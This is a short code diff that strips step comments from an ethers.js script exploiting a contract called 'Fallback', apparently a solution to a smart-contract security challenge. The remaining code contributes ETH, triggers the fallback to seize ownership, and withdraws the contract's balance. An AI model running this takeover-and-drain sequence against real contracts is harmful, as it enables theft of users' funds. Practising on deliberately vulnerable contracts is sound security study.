@@ -22,16 +22,11 @@ export default async function (providerUrl, contractAddress) {
   console.log("Current contract owner address:", await Fallback.owner());
   console.log("Attacker address:", signer.address);
 
-  // Step 1: Contribute
   await (await Fallback.contribute({ value: ethers.parseEther("0.0001") })).wait();
 
-  // Step 2: Send ETH to trigger fallback
   await (await signer.sendTransaction({ to: contractAddress, value: ethers.parseEther("0.0001") })).wait();
-
-  // Step 3: Check owner
   console.log("New owner:", await Fallback.owner());
 
-  // Step 4: Withdraw
   await (await Fallback.withdraw()).wait();
 
   console.log("Exploit complete!");
